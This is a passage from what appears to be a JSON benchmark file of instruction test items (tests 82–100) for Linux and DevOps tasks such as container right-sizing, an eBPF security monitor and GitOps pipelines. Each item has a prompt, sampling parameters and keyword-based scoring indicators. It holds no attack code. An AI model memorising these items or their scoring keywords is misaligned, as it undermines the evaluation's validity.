      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_82",
      "name": "Test 82: Container Resource Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nImplement container resource optimization system:\n1. Analyze container resource usage patterns over time\n2. Identify over-provisioned CPU/memory limits\n3. Optimize Java heap sizes within containers\n4. Implement vertical pod autoscaling recommendations\n5. Analyze container startup time optimization\n6. Optimize base image layers and caching\n7. Implement resource quota optimization\n8. Monitor and optimize init containers\n9. Analyze sidecar container overhead\n10. Generate right-sizing recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement container resource optimization system:\n1. Analyze container resource usage patterns over time\n2. Identify over-provisioned CPU/memory limits\n3. Optimize Java heap sizes within containers\n4. Implement vertical pod autoscaling recommendations\n5. Analyze container startup time optimization\n6. Optimize base image layers and caching\n7. Implement resource quota optimization\n8. Monitor and optimize init containers\n9. Analyze sidecar container overhead\n10. Generate right-sizing recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_83",
      "name": "Test 83: Storage Performance Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive storage performance tuning system:\n1. Analyze filesystem alignment with storage geometry\n2. Optimize RAID parameters for workload\n3. Implement SSD wear leveling monitoring\n4. Tune readahead settings based on access patterns\n5. Optimize journal placement and size\n6. Implement extent allocation optimization\n7. Monitor and tune dirty page writeback\n8. Analyze and optimize snapshot overhead\n9. Implement storage tiering recommendations\n10. Generate storage optimization report\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive storage performance tuning system:\n1. Analyze filesystem alignment with storage geometry\n2. Optimize RAID parameters for workload\n3. Implement SSD wear leveling monitoring\n4. Tune readahead settings based on access patterns\n5. Optimize journal placement and size\n6. Implement extent allocation optimization\n7. Monitor and tune dirty page writeback\n8. Analyze and optimize snapshot overhead\n9. Implement storage tiering recommendations\n10. Generate storage optimization report\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_84",
      "name": "Test 84: Power Management Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a power management optimization system:\n1. Analyze CPU frequency scaling governors\n2. Monitor C-state residency and transitions\n3. Optimize interrupt routing for power efficiency\n4. Implement workload consolidation strategies\n5. Analyze power consumption vs performance trade-offs\n6. Monitor thermal throttling impact\n7. Optimize GPU power management\n8. Implement wake-on-LAN optimization\n9. Analyze peripheral device power usage\n10. Generate power optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a power management optimization system:\n1. Analyze CPU frequency scaling governors\n2. Monitor C-state residency and transitions\n3. Optimize interrupt routing for power efficiency\n4. Implement workload consolidation strategies\n5. Analyze power consumption vs performance trade-offs\n6. Monitor thermal throttling impact\n7. Optimize GPU power management\n8. Implement wake-on-LAN optimization\n9. Analyze peripheral device power usage\n10. Generate power optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_85",
      "name": "Test 85: Memory Allocator Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a memory allocator analysis and optimization toolkit:\n1. Compare different allocators (glibc, jemalloc, tcmalloc)\n2. Analyze allocation patterns and fragmentation\n3. Implement arena tuning for multi-threaded apps\n4. Monitor allocation hot paths\n5. Optimize for NUMA awareness\n6. Implement custom allocation pools\n7. Analyze memory bandwidth utilization\n8. Monitor false sharing in allocations\n9. Implement allocation tracing with low overhead\n10. Generate allocator tuning recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a memory allocator analysis and optimization toolkit:\n1. Compare different allocators (glibc, jemalloc, tcmalloc)\n2. Analyze allocation patterns and fragmentation\n3. Implement arena tuning for multi-threaded apps\n4. Monitor allocation hot paths\n5. Optimize for NUMA awareness\n6. Implement custom allocation pools\n7. Analyze memory bandwidth utilization\n8. Monitor false sharing in allocations\n9. Implement allocation tracing with low overhead\n10. Generate allocator tuning recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_86",
      "name": "Test 86: Kernel Parameter Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a kernel parameter optimization system:\n1. Analyze current sysctl settings\n2. Benchmark impact of key parameters\n3. Optimize VM subsystem parameters\n4. Tune network stack sysctls\n5. Optimize scheduler parameters\n6. Implement security vs performance trade-offs\n7. Monitor parameter changes impact\n8. Create workload-specific profiles\n9. Implement automatic tuning based on workload\n10. Generate kernel tuning recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a kernel parameter optimization system:\n1. Analyze current sysctl settings\n2. Benchmark impact of key parameters\n3. Optimize VM subsystem parameters\n4. Tune network stack sysctls\n5. Optimize scheduler parameters\n6. Implement security vs performance trade-offs\n7. Monitor parameter changes impact\n8. Create workload-specific profiles\n9. Implement automatic tuning based on workload\n10. Generate kernel tuning recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_87",
      "name": "Test 87: Application Thread Pool Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a thread pool optimization system:\n1. Monitor thread pool utilization and queue depths\n2. Analyze task execution times and patterns\n3. Detect thread pool starvation\n4. Optimize pool sizes based on workload\n5. Implement work stealing optimization\n6. Monitor context switch overhead\n7. Analyze thread affinity benefits\n8. Implement dynamic pool sizing\n9. Monitor and prevent thread leaks\n10. Generate thread pool configuration recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a thread pool optimization system:\n1. Monitor thread pool utilization and queue depths\n2. Analyze task execution times and patterns\n3. Detect thread pool starvation\n4. Optimize pool sizes based on workload\n5. Implement work stealing optimization\n6. Monitor context switch overhead\n7. Analyze thread affinity benefits\n8. Implement dynamic pool sizing\n9. Monitor and prevent thread leaks\n10. Generate thread pool configuration recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_88",
      "name": "Test 88: Distributed Cache Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a distributed cache optimization toolkit:\n1. Analyze cache hit rates and miss patterns\n2. Optimize cache key distribution\n3. Implement cache warming strategies\n4. Monitor cache eviction patterns\n5. Optimize serialization overhead\n6. Implement multi-tier caching\n7. Analyze network overhead for cache operations\n8. Monitor cache coherency overhead\n9. Implement predictive cache prefetching\n10. Generate cache optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a distributed cache optimization toolkit:\n1. Analyze cache hit rates and miss patterns\n2. Optimize cache key distribution\n3. Implement cache warming strategies\n4. Monitor cache eviction patterns\n5. Optimize serialization overhead\n6. Implement multi-tier caching\n7. Analyze network overhead for cache operations\n8. Monitor cache coherency overhead\n9. Implement predictive cache prefetching\n10. Generate cache optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_89",
      "name": "Test 89: Load Balancer Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nImplement load balancer optimization system:\n1. Analyze request distribution patterns\n2. Optimize health check intervals and timeouts\n3. Implement least-connection vs round-robin analysis\n4. Monitor connection reuse efficiency\n5. Optimize session persistence strategies\n6. Implement geographic load balancing\n7. Analyze SSL termination overhead\n8. Monitor WebSocket connection distribution\n9. Implement circuit breaker optimization\n10. Generate load balancing recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement load balancer optimization system:\n1. Analyze request distribution patterns\n2. Optimize health check intervals and timeouts\n3. Implement least-connection vs round-robin analysis\n4. Monitor connection reuse efficiency\n5. Optimize session persistence strategies\n6. Implement geographic load balancing\n7. Analyze SSL termination overhead\n8. Monitor WebSocket connection distribution\n9. Implement circuit breaker optimization\n10. Generate load balancing recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_90",
      "name": "Test 90: Query Optimizer Tuning",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a database query optimizer tuning system:\n1. Analyze query execution plans\n2. Identify missing indexes and statistics\n3. Optimize join order and methods\n4. Implement query rewriting recommendations\n5. Monitor parameter sniffing issues\n6. Analyze partition pruning effectiveness\n7. Optimize aggregate computations\n8. Implement materialized view recommendations\n9. Monitor query cache effectiveness\n10. Generate query optimization report\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a database query optimizer tuning system:\n1. Analyze query execution plans\n2. Identify missing indexes and statistics\n3. Optimize join order and methods\n4. Implement query rewriting recommendations\n5. Monitor parameter sniffing issues\n6. Analyze partition pruning effectiveness\n7. Optimize aggregate computations\n8. Implement materialized view recommendations\n9. Monitor query cache effectiveness\n10. Generate query optimization report\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_91",
      "name": "Test 91: eBPF Security Monitor",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nWrite a comprehensive eBPF-based security monitoring system using libbpf:\n1. Hook security_file_open to track all file access with process context\n2. Monitor privilege escalation via setuid/setgid/setcap calls\n3. Track network connections with full process attribution\n4. Detect container escapes by monitoring namespace operations\n5. Implement syscall anomaly detection using sliding window statistics\n6. Monitor kernel module operations and block unauthorized loading\n7. Track memory protection changes (mprotect, mmap with PROT_EXEC)\n8. Implement a ring buffer for high-performance event streaming\n9. Create userspace daemon for event correlation and alerting\n10. Generate security events in CEF format for SIEM integration\nProvide both the BPF C code and Python userspace component.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nWrite a comprehensive eBPF-based security monitoring system using libbpf:\n1. Hook security_file_open to track all file access with process context\n2. Monitor privilege escalation via setuid/setgid/setcap calls\n3. Track network connections with full process attribution\n4. Detect container escapes by monitoring namespace operations\n5. Implement syscall anomaly detection using sliding window statistics\n6. Monitor kernel module operations and block unauthorized loading\n7. Track memory protection changes (mprotect, mmap with PROT_EXEC)\n8. Implement a ring buffer for high-performance event streaming\n9. Create userspace daemon for event correlation and alerting\n10. Generate security events in CEF format for SIEM integration\nProvide both the BPF C code and Python userspace component.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_92",
      "name": "Test 92: Kubernetes Operator Development",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a Kubernetes operator for automated database backup management:\n1. Define CRDs for BackupPolicy and BackupJob resources\n2. Implement controller logic using controller-runtime\n3. Watch for database pods and automatically create backups\n4. Handle backup scheduling with cron expressions\n5. Implement backup retention policies\n6. Store backups in multiple backends (S3, GCS, Azure)\n7. Implement point-in-time recovery capabilities\n8. Add Prometheus metrics for backup status\n9. Implement webhook validation for CRDs\n10. Handle operator upgrades without disrupting backups\nInclude full Go code and Kubernetes manifests.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a Kubernetes operator for automated database backup management:\n1. Define CRDs for BackupPolicy and BackupJob resources\n2. Implement controller logic using controller-runtime\n3. Watch for database pods and automatically create backups\n4. Handle backup scheduling with cron expressions\n5. Implement backup retention policies\n6. Store backups in multiple backends (S3, GCS, Azure)\n7. Implement point-in-time recovery capabilities\n8. Add Prometheus metrics for backup status\n9. Implement webhook validation for CRDs\n10. Handle operator upgrades without disrupting backups\nInclude full Go code and Kubernetes manifests.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_93",
      "name": "Test 93: Service Mesh Advanced Configuration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nImplement advanced Istio service mesh configurations:\n1. Create WASM filters for custom request/response manipulation\n2. Implement multi-cluster service discovery and routing\n3. Configure advanced circuit breaking with adaptive thresholds\n4. Implement canary deployments with automatic rollback\n5. Create custom authorization policies with OPA integration\n6. Configure distributed tracing with baggage propagation\n7. Implement traffic mirroring for testing\n8. Configure mutual TLS with cert rotation\n9. Implement rate limiting with Redis backend\n10. Create observability dashboards with Grafana\nInclude all YAML configurations and custom code.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement advanced Istio service mesh configurations:\n1. Create WASM filters for custom request/response manipulation\n2. Implement multi-cluster service discovery and routing\n3. Configure advanced circuit breaking with adaptive thresholds\n4. Implement canary deployments with automatic rollback\n5. Create custom authorization policies with OPA integration\n6. Configure distributed tracing with baggage propagation\n7. Implement traffic mirroring for testing\n8. Configure mutual TLS with cert rotation\n9. Implement rate limiting with Redis backend\n10. Create observability dashboards with Grafana\nInclude all YAML configurations and custom code.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_94",
      "name": "Test 94: Terraform Infrastructure Testing",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive Terraform testing framework:\n1. Implement unit tests using terraform-plugin-testing\n2. Create integration tests with kitchen-terraform\n3. Implement compliance testing with OPA policies\n4. Build cost estimation and optimization checks\n5. Create security scanning with tfsec integration\n6. Implement drift detection and auto-remediation\n7. Build module dependency analysis\n8. Create performance testing for large infrastructures\n9. Implement blue-green deployment testing\n10. Generate test coverage reports\nInclude example modules and full test suites.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive Terraform testing framework:\n1. Implement unit tests using terraform-plugin-testing\n2. Create integration tests with kitchen-terraform\n3. Implement compliance testing with OPA policies\n4. Build cost estimation and optimization checks\n5. Create security scanning with tfsec integration\n6. Implement drift detection and auto-remediation\n7. Build module dependency analysis\n8. Create performance testing for large infrastructures\n9. Implement blue-green deployment testing\n10. Generate test coverage reports\nInclude example modules and full test suites.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_95",
      "name": "Test 95: GitOps Pipeline Implementation",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a complete GitOps pipeline with ArgoCD:\n1. Implement application manifests with Kustomize\n2. Create ApplicationSets for multi-environment deployments\n3. Implement secrets management with Sealed Secrets\n4. Configure automated image updates with Flux\n5. Implement progressive delivery with Flagger\n6. Create custom health checks for applications\n7. Implement RBAC policies for multi-tenant clusters\n8. Configure notifications to multiple channels\n9. Implement disaster recovery procedures\n10. Create monitoring for GitOps metrics\nInclude all configurations and automation scripts.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a complete GitOps pipeline with ArgoCD:\n1. Implement application manifests with Kustomize\n2. Create ApplicationSets for multi-environment deployments\n3. Implement secrets management with Sealed Secrets\n4. Configure automated image updates with Flux\n5. Implement progressive delivery with Flagger\n6. Create custom health checks for applications\n7. Implement RBAC policies for multi-tenant clusters\n8. Configure notifications to multiple channels\n9. Implement disaster recovery procedures\n10. Create monitoring for GitOps metrics\nInclude all configurations and automation scripts.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_96",
      "name": "Test 96: Observability Platform Integration",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a unified observability platform integration:\n1. Implement OpenTelemetry collectors with custom processors\n2. Create log aggregation with Fluentd/Fluent Bit\n3. Implement distributed tracing correlation\n4. Build custom Prometheus exporters\n5. Create synthetic monitoring with Playwright\n6. Implement SLO/SLI tracking with burn rate alerts\n7. Build anomaly detection using Prophet\n8. Create custom Grafana panels with plugins\n9. Implement event correlation across signals\n10. Build automated root cause analysis\nInclude all configurations and custom code.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a unified observability platform integration:\n1. Implement OpenTelemetry collectors with custom processors\n2. Create log aggregation with Fluentd/Fluent Bit\n3. Implement distributed tracing correlation\n4. Build custom Prometheus exporters\n5. Create synthetic monitoring with Playwright\n6. Implement SLO/SLI tracking with burn rate alerts\n7. Build anomaly detection using Prophet\n8. Create custom Grafana panels with plugins\n9. Implement event correlation across signals\n10. Build automated root cause analysis\nInclude all configurations and custom code.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_97",
      "name": "Test 97: Cloud Native CI/CD Pipeline",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a cloud-native CI/CD pipeline with Tekton:\n1. Define reusable Tasks for common operations\n2. Implement Pipelines with conditional execution\n3. Create custom ClusterTasks for security scanning\n4. Implement GitOps integration with automatic PR creation\n5. Build multi-arch image support\n6. Implement SBOM generation and signing\n7. Create quality gates with automatic rollback\n8. Implement cost tracking for builds\n9. Create custom dashboard for pipeline metrics\n10. Implement ChatOps integration\nInclude all YAML definitions and custom images.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a cloud-native CI/CD pipeline with Tekton:\n1. Define reusable Tasks for common operations\n2. Implement Pipelines with conditional execution\n3. Create custom ClusterTasks for security scanning\n4. Implement GitOps integration with automatic PR creation\n5. Build multi-arch image support\n6. Implement SBOM generation and signing\n7. Create quality gates with automatic rollback\n8. Implement cost tracking for builds\n9. Create custom dashboard for pipeline metrics\n10. Implement ChatOps integration\nInclude all YAML definitions and custom images.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_98",
      "name": "Test 98: Chaos Engineering Platform",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a comprehensive chaos engineering platform:\n1. Implement custom chaos experiments with Litmus\n2. Create GameDay automation scenarios\n3. Build steady-state hypothesis validation\n4. Implement blast radius control\n5. Create automated rollback on SLO breach\n6. Build chaos experiment scheduling\n7. Implement security chaos experiments\n8. Create cost-aware chaos experiments\n9. Build reporting and analytics dashboard\n10. Implement learning loop automation\nInclude experiment definitions and platform code.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive chaos engineering platform:\n1. Implement custom chaos experiments with Litmus\n2. Create GameDay automation scenarios\n3. Build steady-state hypothesis validation\n4. Implement blast radius control\n5. Create automated rollback on SLO breach\n6. Build chaos experiment scheduling\n7. Implement security chaos experiments\n8. Create cost-aware chaos experiments\n9. Build reporting and analytics dashboard\n10. Implement learning loop automation\nInclude experiment definitions and platform code.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_99",
      "name": "Test 99: Policy as Code Framework",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive policy as code framework:\n1. Implement OPA policies for Kubernetes admission\n2. Create Falco rules for runtime security\n3. Build Sentinel policies for Terraform\n4. Implement CUE schemas for configuration validation\n5. Create policy testing frameworks\n6. Build policy violation remediation\n7. Implement policy versioning and rollback\n8. Create compliance reporting dashboards\n9. Build policy simulation environments\n10. Implement policy performance optimization\nInclude all policy definitions and tooling.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive policy as code framework:\n1. Implement OPA policies for Kubernetes admission\n2. Create Falco rules for runtime security\n3. Build Sentinel policies for Terraform\n4. Implement CUE schemas for configuration validation\n5. Create policy testing frameworks\n6. Build policy violation remediation\n7. Implement policy versioning and rollback\n8. Create compliance reporting dashboards\n9. Build policy simulation environments\n10. Implement policy performance optimization\nInclude all policy definitions and tooling.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_100",
      "name": "Test 100: Platform Engineering Toolkit",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a complete platform engineering toolkit:\n1. Create developer portal with Backstage\n2. Implement service catalog with templates\n3. Build automated environment provisioning\n4. Create cost allocation and showback\n5. Implement developer productivity metrics\n6. Build self-service infrastructure\n7. Create platform API abstractions\n8. Implement golden paths for common use cases\n9. Build platform health dashboard\n10. Create platform documentation generator\nInclude all code, configurations, and templates.\n",
      "messages": [
        {
          "role": "user",
